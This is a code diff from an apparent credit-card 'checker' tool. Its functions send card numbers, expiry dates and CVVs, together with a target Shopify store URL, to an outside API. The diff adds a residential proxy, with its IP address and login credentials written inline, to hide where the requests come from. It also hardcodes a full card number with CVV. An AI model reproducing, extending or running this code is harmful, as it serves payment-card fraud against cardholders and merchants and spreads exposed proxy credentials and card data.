@@ -2019,7 +2019,7 @@ def test_shopify_site(url):
         # Use the fixed test card instead of generating random one
         test_card = "5547300001996183|11|2028|197"
         
-        api_url = f"https://rohitvishal.dev/index.php?site={url}&cc={test_card}"
+        api_url = f"https://rohitvishal.dev/index.php?site={url}&cc={test_card}&proxy=212.8.249.134:9999:rjhk1wsqtq-corp.mobile.res-country-EG-state-360631-city-360630-hold-query:Q7A8mEhCg5OWRdSj"
         response = requests.get(api_url, timeout=100)
         
         if response.status_code != 200:
@@ -2190,7 +2190,7 @@ def check_shopify_cc(cc, site_info):
             pass
 
         # Make API request
-        api_url = f"https://rohitvishal.dev/index.php?site={site_info['url']}&cc={formatted_cc}"
+        api_url = f"https://rohitvishal.dev/index.php?site={site_info['url']}&cc={formatted_cc}&proxy=212.8.249.134:9999:rjhk1wsqtq-corp.mobile.res-country-EG-state-360631-city-360630-hold-query:Q7A8mEhCg5OWRdSj"
         response = requests.get(api_url, timeout=100)
         
         if response.status_code != 200:
